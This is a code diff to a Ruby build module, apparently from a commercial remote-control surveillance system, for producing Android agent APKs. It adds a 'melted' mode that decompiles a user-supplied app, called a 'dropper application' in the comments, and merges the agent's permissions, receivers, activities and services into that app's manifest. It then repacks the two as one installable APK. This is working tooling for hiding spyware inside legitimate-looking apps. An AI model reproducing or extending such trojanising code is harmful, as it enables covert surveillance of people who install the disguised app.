@@ -5,6 +5,8 @@
 # from RCS::Common
 require 'rcs-common/trace'
 
+require 'xmlsimple'
+
 module RCS
 module DB
 
@@ -21,16 +23,21 @@ class BuildAndroid < Build
     trace :debug, "Build: apktool extract: #{@tmpdir}/apk"
 
     apktool = path('apktool.jar')
+    
     Dir[path('core.*.apk')].each do |d| 
       version = d.scan(/core.android.(.*).apk/).flatten.first
 
-      CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{d} #{@tmpdir}/apk.#{version}"
-      
-      if File.exist?(path("apk.#{version}/assets/r.bin"))
-        @outputs << ["apk.#{version}/assets/r.bin", "apk.#{version}/assets/c.bin"]
+      if version == "melt" then
+        #CrossPlatform.exec "java", "-jar #{apktool} if #{@tmpdir}/jelly.apk jelly" 
+        CrossPlatform.exec "java", "-jar #{apktool} d #{d} #{@tmpdir}/apk.#{version}"
       else
-        raise "unpack failed. needed file not found"
+        CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{d}  #{@tmpdir}/apk.#{version}"
       end
+      
+      ["r.bin", "c.bin"].each do |asset|
+        raise "unpack failed. needed asset #{asset} not found" unless File.exist?(path("apk.#{version}/assets/#{asset}"))
+      end
+      
     end
   end
 
@@ -40,7 +47,7 @@ class BuildAndroid < Build
     # enforce demo flag accordingly to the license
     # or raise if cannot build
     params['demo'] = LicenseManager.instance.can_build_platform :android, params['demo']
-      
+
     Dir[path('core.*.apk')].each do |d| 
       version = d.scan(/core.android.(.*).apk/).flatten.first
 
@@ -53,12 +60,12 @@ class BuildAndroid < Build
       super
       
       patch_file(:file => params[:core]) do |content|
-        begin
-          method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
-          content.binary_patch 'IrXCtyrrDXMJEvOU', method
-        rescue
-          raise "Working method marker not found"
-        end
+      begin
+        method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
+        content.binary_patch 'IrXCtyrrDXMJEvOU', method
+      rescue
+        raise "Working method marker not found"
+      end
       end
     end
   end
@@ -67,24 +74,23 @@ class BuildAndroid < Build
     trace :debug, "Build: melting: #{params}"
 
     @appname = params['appname'] || 'install'
-
-    apktool = path('apktool.jar')
-   	File.chmod(0755, path('aapt')) if File.exist? path('aapt')
     @outputs = []
     
-    Dir[path('core.*.apk')].each do |d| 
-      version = d.scan(/core.android.(.*).apk/).flatten.first
-      apk = path("output.#{version}.apk")
+    # choose the correct melting mode
+    melting_mode = :silent
+    melting_mode = :melted if params['input']
 
-      CrossPlatform.exec "java", "-jar #{apktool} b #{@tmpdir}/apk.#{version} #{apk}", {add_path: @tmpdir}
-      
-      if File.exist?(apk)
-        @outputs << "output.#{version}.apk"
-      else
-        raise "pack failed."
-      end
+    case melting_mode
+      when :silent
+        silent()
+      when :melted
+        # user-provided file to melt with
+        melted(Config.instance.temp(params['input']))
     end
 
+    trace :debug, "Build: melt output is: #{@outputs.inspect}"
+    
+    raise "Melt failed" if @outputs.empty?
   end
 
   def sign(params)
@@ -120,7 +126,6 @@ class BuildAndroid < Build
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
       @outputs.each do |o|
-        trace :debug, "adding: #{o}" 
         z.file.open(o, "wb") { |f| f.write File.open(path(o), 'rb') {|f| f.read} }
       end
     end
@@ -131,7 +136,6 @@ class BuildAndroid < Build
   end
 
   def unique(core)
-
     Zip::ZipFile.open(core) do |z|
       z.each do |f|
         f_path = path(f.name)
@@ -145,6 +149,7 @@ class BuildAndroid < Build
     end
 
     apktool = path('apktool.jar')
+
     Dir[path('core.*.apk')].each do |apk|
       version = apk.scan(/core.android.(.*).apk/).flatten.first
 
@@ -158,14 +163,164 @@ class BuildAndroid < Build
 
       CrossPlatform.exec "java", "-jar #{apktool} b #{@tmpdir}/apk.#{version} #{apk}", {add_path: @tmpdir}
 
-      core_content = File.open(apk, "rb") { |f| f.read }
-
       # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
       CrossPlatform.exec "zip", "-j -u #{core} #{apk}"
       FileUtils.rm_rf Config.instance.temp('apk')
     end
   end
+  
+  private
+  
+  def silent()
 
+    apktool = path('apktool.jar')
+    File.chmod(0755, path('aapt')) if File.exist? path('aapt')
+    
+    Dir[path('core.*.apk')].each do |d| 
+      version = d.scan(/core.android.(.*).apk/).flatten.first
+      next if version == "melt"
+      
+      apk = path("output.#{version}.apk")
+
+      CrossPlatform.exec "java", "-jar #{apktool} b #{@tmpdir}/apk.#{version} #{apk}", {add_path: @tmpdir}
+
+      raise "Silent Melt: pack failed." unless File.exist?(apk)
+      
+      @outputs << "output.#{version}.apk"
+    end
+  end
+
+  def melted(input)    
+    apktool = path('apktool.jar')
+    
+    FileUtils.mv input, path('input')
+    rcsdir = "#{@tmpdir}/apk.melt"
+    pkgdir = "#{@tmpdir}/melt_input"
+
+    # unpack the dropper application
+    CrossPlatform.exec "java", "-jar #{apktool} d #{path('input')} #{pkgdir}"
+
+    # load and mix the manifest and resources
+    newmanifest = parseManifest(rcsdir, pkgdir)
+    style, color = parseStyle(rcsdir, pkgdir)
+
+    # merge the directories
+    merge(rcsdir, pkgdir)
+
+    # fix the xml headers
+    patchXml("#{rcsdir}/AndroidManifest.xml", newmanifest)
+    patchXml("#{rcsdir}/res/values/styles.xml", style)
+    patchXml("#{rcsdir}/res/values/colors.xml", color)
+    
+    # fix textAllCaps
+    patchResources(rcsdir)
+
+    # repack the final application
+    apk = path("output.melt.apk")
+    CrossPlatform.exec "java", "-jar #{apktool} b #{rcsdir} #{apk}", {add_path: @tmpdir}
+      
+    @outputs = ["output.melt.apk"] if File.exist?(apk)
+  end
+  
+  def parseManifest(rcsdir, pkgdir)
+    trace :debug, "parse manifest #{rcsdir}, #{pkgdir}"
+
+    xmlrcs = XmlSimple.xml_in("#{rcsdir}/AndroidManifest.xml", {'KeepRoot' => true})
+    xmlpkg = XmlSimple.xml_in("#{pkgdir}/AndroidManifest.xml", {'KeepRoot' => true})
+
+    mixManifestPermission(xmlpkg, xmlrcs, "uses-permission")
+    mixManifestApplication(xmlpkg, xmlrcs, "receiver")
+    mixManifestApplication(xmlpkg, xmlrcs, "activity")
+    mixManifestApplication(xmlpkg, xmlrcs, "service")
+
+    return XmlSimple.xml_out(xmlpkg, {'KeepRoot' => true});
+
+  rescue Exception => e
+    trace :error, "Cannot parse Manifest: #{e.message}"
+    raise "Cannot parse Manifest: #{e.message}"
+  end
+
+  def mixManifestPermission(xmlpkg, xmlrcs, key)
+    tmppkg = xmlpkg["manifest"][0]
+    tmprcs = xmlrcs["manifest"][0]
+
+    if tmppkg.has_key? key
+      tmppkg[key] += tmprcs[key]
+    else
+      tmppkg[key] = tmprcs[key]
+    end
+  end
+  
+  def mixManifestApplication(xmlpkg, xmlrcs, key)
+    tmppkg = xmlpkg["manifest"][0]["application"][0]
+    tmprcs = xmlrcs["manifest"][0]["application"][0]
+
+    if tmppkg.has_key? key
+      tmppkg[key] += tmprcs[key]
+    else
+      tmppkg[key] = tmprcs[key]
+    end
+  end
+  
+  def parseStyle(rcsdir, pkgdir)
+    style = mixManifestResources("#{pkgdir}/res/values/styles.xml", "#{rcsdir}/res/values/styles.xml", "style")
+    color = mixManifestResources("#{pkgdir}/res/values/colors.xml", "#{rcsdir}/res/values/colors.xml", "color")
+    
+    manifestStyle = XmlSimple.xml_out(style, {'KeepRoot' => true})
+    manifestCol =  XmlSimple.xml_out(color, {'KeepRoot' => true})
+
+    return manifestStyle, manifestCol
+  end
+  
+  def patchXml(file, xml)
+    xml.insert(0, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
+    File.open(file, "w") {|f| f.write xml}
+  end
+  
+  def patchResources(rcsdir)
+    matches = ['android:textAllCaps="true"', '<item name="android:borderTop">true</item>']
+    #matches = ['android:textAllCaps="true"']
+
+    Dir["#{rcsdir}/res/**/*.xml"].each do |filename|
+      found = false
+      content = ""
+
+      File.open(filename, 'r').each do |line|
+        matches.each do |match|
+        if line.include? match
+          found = true
+          line = line.sub(match, '')
+        end
+      end
+      
+      content+=line
+    end
+    
+    trace :debug, "melt resource patched: #{filename}" if found  
+    File.open("#{filename}", 'w') { |out_file| out_file.write content } if found
+
+    end
+  end
+
+  
+  def mixManifestResources(from, to, key)
+    xt = XmlSimple.xml_in to, {'KeepRoot' => true}
+
+    if File.exists? from
+      xml = XmlSimple.xml_in from, {'KeepRoot' => true}
+      xml["resources"][0][key] += xt["resources"][0][key]
+    else
+      xml = xt
+    end
+
+    return xml
+  end
+
+  def merge(rcsdir, pkgdir)
+    FileUtils.rm "#{rcsdir}/res/layout/main.xml"
+    FileUtils.cp_r "#{pkgdir}/.", "#{rcsdir}"
+  end
+  
 end
 
 end #DB::
